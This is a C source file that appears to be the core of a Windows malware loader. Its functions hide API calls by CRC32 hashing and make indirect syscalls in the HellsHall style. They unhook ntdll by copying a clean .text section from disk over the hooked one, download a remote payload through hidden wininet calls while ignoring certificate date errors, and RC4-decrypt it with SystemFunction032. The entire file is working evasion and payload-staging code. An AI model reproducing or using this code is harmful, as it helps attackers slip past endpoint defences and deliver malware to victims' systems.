#include "Structs.h"
#include "HellsHall.h"
#include "Core.h"
#include "ApiHashing.h"

#include <amsi.h>
#include <Windows.h>
#include <wininet.h>
#include <Tlhelp32.h>

#define NtCreateFile_CRC32					0x9010089D
#define NtCreateSection_CRC32				0xF85C77EC
#define NtMapViewOfSection_CRC32			0xB347A7C1
#define NtProtectVirtualMemory_CRC32		0x17C9087B
#define NtUnmapViewOfSection_CRC32			0x830A04FC
#define NtClose_CRC32						0x0EDFC5CB

#define WININETDLL_H						0xCD6BD9C9
#define InternetOpenW_H						0x22DAF090
#define InternetOpenUrlW_H					0xB1D32FFE
#define InternetReadFile_H					0x28A207BA
#define InternetCloseHandle_H				0xCBBA413C
#define InternetSetOptionW_H				0xA9DF90C2

#define NTDLLDLL_H							0x1C8BDEBA
#define NtAllocateVirtualMemory_H			0x498165AA
#define LdrLoadDll_H						0xB4F63B83

#define KERNEL32DLL_H						0x377D97D5
#define GetCurrentProcess_H					0x36A1243A
#define LocalReAlloc_H						0x5AE92FB0
#define LocalAlloc_H						0x27F5E0F8
#define GetWindowsDirectoryW_H				0x1865FCE5
#define LocalFree_H							0x42B3C6A0

#define ADVAPI32DLL_H						0xACF5DF37

#define CRYPTSPDLL_H						0x44FE95E1
#define SystemFunction032_H					0x7E5326F1

void* _memcpy(void* dest, const void* src, size_t count)
{

	char* dest2 = (char*)dest;
	const char* src2 = (const char*)src;

	while (count--)
		*dest2++ = *src2++;

	return dest;
}

int _wsprintfW(wchar_t* szDest, size_t szDestSize, const wchar_t* szFormat, ...)
{
	va_list args;
	va_start(args, szFormat);

	int written = 0;
	wchar_t* pDest = szDest;

	for (const wchar_t* p = szFormat; *p != L'\0'; p++) {
		if (*p == L'%' && *(p + 1) == L's') {
			p++; 
			const wchar_t* strArg = va_arg(args, const wchar_t*);
			while (*strArg && written < szDestSize - 1) {
				*pDest++ = *strArg++;
				written++;
			}
		}
		else {
			if (written < szDestSize - 1) {
				*pDest++ = *p;
				written++;
			}
		}
	}
	*pDest = L'\0'; 
	va_end(args);

	return written;
}

#pragma intrinsic(memset)
#pragma function(memset)

void* __cdecl memset(void* Destination, int Value, size_t Size) {
	unsigned char* p = (unsigned char*)Destination;
	while (Size > 0) {
		*p = (unsigned char)Value;
		p++;
		Size--;
	}
	return Destination;
}

LPWSTR _wcscpy(LPWSTR dest, LPCWSTR src) {
	LPWSTR original = dest;
	while ((*dest++ = *src++) != L'\0');
	return original;
}

SIZE_T _wcslen(LPCWSTR str) {
	SIZE_T len = 0;
	while (str[len] != L'\0') {
		len++;
	}
	return len;
}

typedef struct _NTAPI_FUNC
{
	NT_SYSCALL	NtCreateFile;
	NT_SYSCALL	NtCreateSection;
	NT_SYSCALL	NtMapViewOfSection;
	NT_SYSCALL	NtProtectVirtualMemory;
	NT_SYSCALL	NtUnmapViewOfSection;
	NT_SYSCALL	NtClose;

} NTAPI_FUNC, * PNTAPI_FUNC;

NTAPI_FUNC g_NTAPI = { 0 };

BOOL InitializeNtSyscalls() {

	if (!FetchNtSyscall(NtCreateFile_CRC32, &g_NTAPI.NtCreateFile)) {
		return FALSE;
	}

	if (!FetchNtSyscall(NtCreateSection_CRC32, &g_NTAPI.NtCreateSection)) {
		return FALSE;
	}

	if (!FetchNtSyscall(NtMapViewOfSection_CRC32, &g_NTAPI.NtMapViewOfSection)) {
		return FALSE;
	}

	if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, &g_NTAPI.NtProtectVirtualMemory)) {
		return FALSE;
	}

	if (!FetchNtSyscall(NtUnmapViewOfSection_CRC32, &g_NTAPI.NtUnmapViewOfSection)) {
		return FALSE;
	}

	if (!FetchNtSyscall(NtClose_CRC32, &g_NTAPI.NtClose)) {
		return FALSE;
	}

	return TRUE;
}

VOID RtlInitUnicodeString(IN OUT PUNICODE_STRING DestinationString, IN PCWSTR SourceString) {

	SIZE_T DestSize;

	if (SourceString)
	{
		DestSize = _wcslen(SourceString) * sizeof(WCHAR);
		DestinationString->Length = (USHORT)DestSize;
		DestinationString->MaximumLength = (USHORT)DestSize + sizeof(WCHAR);
	}
	else
	{
		DestinationString->Length = 0;
		DestinationString->MaximumLength = 0;
	}

	DestinationString->Buffer = (PWCHAR)SourceString;
}

BOOL UnhookNtdllFromDisk(IN HMODULE hNtdllBase) {

	if (!hNtdllBase)
		return FALSE;

	NTSTATUS				STATUS = 0x00;
	WCHAR					szWindowsDir[MAX_PATH / 2] = { 0 };
	WCHAR					szNtdllPath[MAX_PATH] = { 0 };
	HANDLE					hFile = NULL,
		hSection = NULL;
	OBJECT_ATTRIBUTES		ObjAttributes = { 0 };
	UNICODE_STRING			UnicodeStr = { 0 };
	IO_STATUS_BLOCK			IOStatusBlock = { 0 };
	PVOID					pBaseAddress = NULL,
		pHookedNtdllTxt = NULL,
		pNewNtdllTxt = NULL;
	SIZE_T					sViewSize = NULL,
		sNtdllTxtLength = NULL,
		sNtdllTxtLength2 = NULL;
	PIMAGE_NT_HEADERS		pImgNtHdrs = { 0 };
	PIMAGE_SECTION_HEADER	pImgSecHdr = { 0 };
	DWORD					dwOldProtection = 0x00;
	BOOL					bResult = FALSE;

	if (!InitializeNtSyscalls())
		return FALSE;

	HMODULE hKernel32Base = GetModuleHandleH(KERNEL32DLL_H);
	fnGetWindowsDirectoryW pGetWindowsDirectoryW = (fnGetWindowsDirectoryW)GetProcAddressH(hKernel32Base, GetWindowsDirectoryW_H);

	if (!pGetWindowsDirectoryW(szWindowsDir, MAX_PATH / 2)) {
		return FALSE;
	}

	wchar_t cNtdllDll[] = {L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', L'\0'};
	wchar_t cSystem32[] = {L'\\', L'?', L'?', L'\\', L'\\', L'\%', L's', L'\\', L'S', L'y', L's', L't', L'e', L'm', L'3', L'2', L'\\', L'\%', L's', L'\0'};
	_wsprintfW(szNtdllPath, sizeof(szNtdllPath) / sizeof(wchar_t), cSystem32, szWindowsDir, cNtdllDll);
	RtlInitUnicodeString(&UnicodeStr, szNtdllPath);
	InitializeObjectAttributes(&ObjAttributes, &UnicodeStr, OBJ_CASE_INSENSITIVE, NULL, NULL);

	SET_SYSCALL(g_NTAPI.NtCreateFile);
	if (!NT_SUCCESS((STATUS = RunSyscall(&hFile, FILE_GENERIC_READ, &ObjAttributes, &IOStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_RANDOM_ACCESS, NULL, 0x00))) || hFile == NULL) {
		return FALSE;
	}

	SET_SYSCALL(g_NTAPI.NtCreateSection);
	if (!NT_SUCCESS((STATUS = RunSyscall(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE_NO_EXECUTE, hFile)))) {
		goto _END_OF_FUNC;
	}

	SET_SYSCALL(g_NTAPI.NtMapViewOfSection);
	if (!NT_SUCCESS((STATUS = RunSyscall(hSection, NtCurrentProcess(), &pBaseAddress, NULL, NULL, NULL, &sViewSize, ViewShare, 0x00, PAGE_READONLY))) || pBaseAddress == NULL) {
		goto _END_OF_FUNC;
	}

	pImgNtHdrs = (PIMAGE_NT_HEADERS)((ULONG_PTR)hNtdllBase + ((PIMAGE_DOS_HEADER)hNtdllBase)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		goto _END_OF_FUNC;

	pImgSecHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);
	for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {

		if ((*(ULONG*)pImgSecHdr[i].Name | 0x20202020) == 'xet.') {

			pHookedNtdllTxt = (PVOID)((ULONG_PTR)hNtdllBase + pImgSecHdr[i].VirtualAddress);
			pNewNtdllTxt = (PVOID)((ULONG_PTR)pBaseAddress + pImgSecHdr[i].VirtualAddress);
			sNtdllTxtLength = sNtdllTxtLength2 = (SIZE_T)pImgSecHdr[i].Misc.VirtualSize;
			break;
		}
	}

	if (!pHookedNtdllTxt || !pNewNtdllTxt || !sNtdllTxtLength)
		goto _END_OF_FUNC;

	SET_SYSCALL(g_NTAPI.NtProtectVirtualMemory);
	if (!NT_SUCCESS((STATUS = RunSyscall(NtCurrentProcess(), &pHookedNtdllTxt, &sNtdllTxtLength, PAGE_EXECUTE_READWRITE, &dwOldProtection)))) {
		goto _END_OF_FUNC;
	}

	_memcpy(pHookedNtdllTxt, pNewNtdllTxt, sNtdllTxtLength2);

	SET_SYSCALL(g_NTAPI.NtProtectVirtualMemory);
	if (!NT_SUCCESS((STATUS = RunSyscall(NtCurrentProcess(), &pHookedNtdllTxt, &sNtdllTxtLength, dwOldProtection, &dwOldProtection)))) {
		goto _END_OF_FUNC;
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (pBaseAddress) {
		SET_SYSCALL(g_NTAPI.NtUnmapViewOfSection);
		if (!NT_SUCCESS((RunSyscall(NtCurrentProcess(), pBaseAddress)))) {
			return FALSE;
		}
	}
	if (hSection) {
		SET_SYSCALL(g_NTAPI.NtClose);
		if (!NT_SUCCESS((STATUS = RunSyscall(hSection)))) {
			return FALSE;
		}
	}
	if (hFile) {
		SET_SYSCALL(g_NTAPI.NtClose);
		if (!NT_SUCCESS((STATUS = RunSyscall(hFile)))) {
			return FALSE;
		}
	}

	return bResult;
}

BOOL FetchFileFromURLW(IN LPCWSTR szFileDownloadUrl, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize)
{

	HINTERNET hInternet = NULL, hInternetFile = NULL;
	PBYTE pTmpPntr = NULL, pFileBuffer = NULL;
	DWORD dwTmpBytesRead = 0x00, dwFileSize = 0x00;

	if (!ppFileBuffer || !pdwFileSize) {
		return FALSE;
	}

	*ppFileBuffer = NULL;
	*pdwFileSize = 0;

	HMODULE hWininetModule = GetModuleHandleH(WININETDLL_H);
	if (!hWininetModule) {
		goto _END_OF_FUNC;
	}

	fnInternetOpenW pInternetOpenW = (fnInternetOpenW)GetProcAddressH(hWininetModule, InternetOpenW_H);
	if (!pInternetOpenW) {
		goto _END_OF_FUNC;
	}

	hInternet = pInternetOpenW(NULL, 0, NULL, NULL, 0);
	if (!hInternet) {
		goto _END_OF_FUNC;
	}

	fnInternetOpenUrlW pInternetOpenUrlW = (fnInternetOpenUrlW)GetProcAddressH(hWininetModule, InternetOpenUrlW_H);
	if (!pInternetOpenUrlW) {
		goto _END_OF_FUNC;
	}

	hInternetFile = pInternetOpenUrlW(hInternet, szFileDownloadUrl, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
	if (!hInternetFile) {
		goto _END_OF_FUNC;
	}

	HMODULE hKernel32Base = GetModuleHandleH(KERNEL32DLL_H);
	fnLocalAlloc pLocalAlloc = (fnLocalAlloc)GetProcAddressH(hKernel32Base, LocalAlloc_H);

	pTmpPntr = pLocalAlloc(LPTR, 1024);

	if (!pTmpPntr) {
		goto _END_OF_FUNC;
	}

	fnInternetReadFile pInternetReadFile = (fnInternetReadFile)GetProcAddressH(hWininetModule, InternetReadFile_H);
	if (!pInternetReadFile) {
		goto _END_OF_FUNC;
	}

	while (TRUE) {
		if (!pInternetReadFile(hInternetFile, pTmpPntr, 1024, &dwTmpBytesRead)) {
			goto _END_OF_FUNC;
		}

		if (dwTmpBytesRead == 0) break;

		PBYTE pNewBuffer = NULL;
		if (!pFileBuffer) {
			pNewBuffer = pLocalAlloc(LPTR, dwTmpBytesRead);
		}
		else {

			fnLocalReAlloc pLocalReAlloc = (fnLocalReAlloc)GetProcAddressH(hKernel32Base, LocalReAlloc_H);
			pNewBuffer = pLocalReAlloc(pFileBuffer, dwFileSize + dwTmpBytesRead, LMEM_MOVEABLE | LMEM_ZEROINIT);
		}

		if (!pNewBuffer) {
			goto _END_OF_FUNC;
		}

		pFileBuffer = pNewBuffer;
		_memcpy(pFileBuffer + dwFileSize, pTmpPntr, dwTmpBytesRead);
		dwFileSize += dwTmpBytesRead;
	}

	*ppFileBuffer = pFileBuffer;
	*pdwFileSize = dwFileSize;

_END_OF_FUNC:

	if (pTmpPntr) {
		fnLocalFree pLocalFree = (fnLocalFree)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_H), LocalFree_H);
		pLocalFree(pTmpPntr);
	}
	if ((!*ppFileBuffer || !*pdwFileSize) && pFileBuffer) {
		fnLocalFree pLocalFree = (fnLocalFree)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_H), LocalFree_H);
		pLocalFree(pFileBuffer);
	}

	fnInternetCloseHandle pInternetCloseHandle = (fnInternetCloseHandle)GetProcAddressH(hWininetModule, InternetCloseHandle_H);

	if (pInternetCloseHandle) {
		if (hInternetFile) {
			pInternetCloseHandle(hInternetFile);
		}
		if (hInternet) {
			pInternetCloseHandle(hInternet);
		}
	}

	fnInternetSetOptionW pInternetSetOptionW = (fnInternetSetOptionW)GetProcAddressH(hWininetModule, InternetSetOptionW_H);
	if (pInternetSetOptionW && hInternet) {
		pInternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	}

	return (*ppFileBuffer != NULL && *pdwFileSize != 0);
}

typedef ULONG(WINAPI* fnVerifierEnumerateResource)(HANDLE Process, ULONG Flags, ULONG ResourceType, PVOID ResourceCallback, PVOID EnumerationContext);

BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

	NTSTATUS	STATUS = NULL;
	USTRING		Key = { .Buffer = pRc4Key, 		.Length = dwRc4KeySize,		.MaximumLength = dwRc4KeySize },
		Img = { .Buffer = pPayloadData, 	.Length = sPayloadSize,		.MaximumLength = sPayloadSize };

	wchar_t sCryptspDll[] = { L'C', L'R', L'Y', L'P', L'T', L'S', L'P', L'.', L'D', L'L', L'L', L'\0' };
	if (!LdrLoadDll(sCryptspDll)) {
		return FALSE;
	}

	HMODULE hCryptspBase = GetModuleHandleH(CRYPTSPDLL_H);
	fnSystemFunction032 pSystemFunction032 = (fnSystemFunction032)GetProcAddressH(hCryptspBase, SystemFunction032_H);

	if ((STATUS = pSystemFunction032(&Img, &Key)) != 0x0) {
		return FALSE;
	}

	return TRUE;
}

typedef NTSTATUS(WINAPI* fnLdrLoadDll)(PWSTR pDllPath, PULONG pDllCharacteristics, PUNICODE_STRING pDllName, PVOID* ppDllHandle);

LPVOID LdrLoadDll(IN LPWSTR ModuleName)
{

	NTSTATUS            STATUS = 0x00;
	UNICODE_STRING      usDllName = { 0 };
	LPVOID              pModule = NULL;
	fnLdrLoadDll        pLdrLoadDll = NULL;

	if (!(pLdrLoadDll = (fnLdrLoadDll)GetProcAddressH(GetModuleHandleH(NTDLLDLL_H), LdrLoadDll_H))) {
		return NULL;
	}

	RtlInitUnicodeString(&usDllName, ModuleName);

	if ((STATUS = pLdrLoadDll(NULL, NULL, &usDllName, &pModule)) != 0x00) {
		return NULL;
	}

	return pModule;
}